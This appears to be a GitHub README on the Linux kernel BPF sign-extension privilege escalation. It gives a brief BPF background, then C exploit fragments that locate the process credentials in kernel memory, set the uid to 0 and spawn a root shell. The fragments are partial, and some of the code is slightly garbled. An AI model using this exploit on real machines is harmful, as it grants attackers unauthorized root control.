# Linux Kernel - BPF Sign Extension Local Privilege Escalation

![alt text](https://github.com/samaleyadeh/images/blob/master/DY42GCGV4AA1_8F.jpg) 


## What is [BPF](https://en.wikipedia.org/wiki/Berkeley_Packet_Filter)?

As you may know, the user layer and kernel layer of Linux are isolated. If you want the kernel to execute the user's code, you need to write the kernel module which can only be loaded by the root user. The BPF (Berkeley Packet Filter) provides a bridge between code and data transfer between the user and the kernel. The user can use the eBPF instruction bytecode to deliver code to the kernel, and trigger the kernel to execute the user-provided code through events (such as writing data to the socket), and share the data with the kernel in the form of map (key - value). The user layer writes data to the map, and the kernel layer fetches data from the map, and vice versa. 
The original intention of BPF is to filter the network at the bottom, and later it can easily inject code into the kernel. It is widely used for packet capture, kernel probe, Performance monitoring and other fields. 
eBPF virtual instruction system
The eBPF virtual instruction system belongs to Reduced Instruction Set Computer (RISC) and has 10 64-bit virtual registers, r0-r10. r0 stores the return value, r1 to r5 is reserved for arguments, r6 to r9 is reserved for storing callee saved registers and r10 stores read-only frame pointer. In actual operation, the virtual machine corresponds these 10 registers to the 10 physical registers of the hardware CPU: R0 - rax, R1 - rdi , R2 - rsi , R3 - rdx , R4 - rcx , R5 - r8 , R6 - rbx , R7 - r13 , R8 - r14 , R9 - r15 , R10 â€“ rbp(frame pointer).
Each BPF instruction on x64 platform is of 64-bit long. The format of each instruction is as follows:

![alt text](https://github.com/samaleyadeh/images/blob/master/zero-day-attack-1024x413.jpg) 


## What is Sign Extension?
![alt text](https://github.com/samaleyadeh/images/blob/master/sign-extension-example-n.jpg) 



## What is Privilege Escalation
![alt text](https://github.com/samaleyadeh/images/blob/master/300px-Priv_rings.svg.png?raw=true) 





```C
Struct bpf_insn { 
    __u8 code;         /* opcode */ 
    __u8 dst_reg: 4 ;     /* dest register */ 
    __u8 src_reg: 4 ;     /* source register */ 
    __s16 off;         /* signed offset */ 
    __s32 imm;         /* signed immediate constant */ 
};
```





```C

#define BPF_MOV32_IMM(DST, IMM) \ 
    (( struct bpf_insn) { \ 
        .code   = BPF_ALU | BPF_MOV | BPF_K, \ 
        .dst_reg = DST, \ 
        .src_reg = 0 , \ 
        .off    = 0 , \ 
        .imm    = IMM })

```


```C
uint64_t fp, sp, task_struct, credptr, uidptr;

	fp = __get_fp();
	if (fp < PHYS_OFFSET)
		__exit("bogus fp");
	
	sp = get_sp(fp);
	if (sp < PHYS_OFFSET)
		__exit("bogus sp");
	
	task_struct = __read(sp);

	if (task_struct < PHYS_OFFSET)
		__exit("bogus task ptr");

	printf("task_struct = %lx\n", task_struct);
```


```C
	credptr = __read(task_struct + CRED_OFFSET); // cred

	if (credptr < PHYS_OFFSET)
		__exit("bogus cred ptr");

	uidptr = credptr + UID_OFFSET; // uid
	if (uidptr < PHYS_OFFSET)
		__exit("bogus uid ptr");

	printf("uidptr = %lx\n", uidptr);
	__write(uidptr, 0); // set both uid and gid to 0

	if (getuid() == 0) {
		printf("spawning root shell\n");
		system("/bin/bash");
		exit(0);
	}

	__exit("not vulnerable?");
}
```






